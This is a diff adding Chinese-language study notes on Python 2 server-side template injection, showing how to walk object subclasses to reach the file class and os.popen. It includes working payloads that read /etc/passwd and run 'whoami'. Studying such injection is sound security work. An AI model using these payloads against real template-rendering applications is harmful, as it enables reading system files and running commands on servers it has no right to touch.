@@ -265,6 +265,44 @@ desktop-13qds1a\lenovo
 
 *[这里](#Python中的一些 Magic Method)
 
+>因为python3和python2两个版本下有差别，这里把python2单独拿出来说
+>
+>tips：python2的`string`类型不直接从属于属于基类，所以要用两次 `__bases__[0]`
+>
+>![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/format,png.png)
+>
+>- `file`类读写文件
+>
+>本方法只能适用于python2，因为在python3中`file`类已经被移除了
+>
+>可以使用dir查看file对象中的内置方法
+>
+>```
+>>>> dir(().__class__.__bases__[0].__subclasses__()[40])
+>['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
+>```
+>
+>读文件
+>
+>```
+>{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
+> 
+>{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}
+>```
+>
+>- warnings类中的linecache
+>
+>
+>本方法只能用于python2，因为在python3中会报错'function object' has no attribute 'func_globals'，python3中func_globals被移除了
+>
+>```
+># 含有linecache的类
+>(<class 'warnings.WarningMessage'>, 59)
+>(<class 'warnings.catch_warnings'>, 60)
+>```
+>
+>payload：`{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()}}`
+
 ```
 >>> for i in enumerate(''.__class__.__base__.__subclasses__()): print(i)
 ```
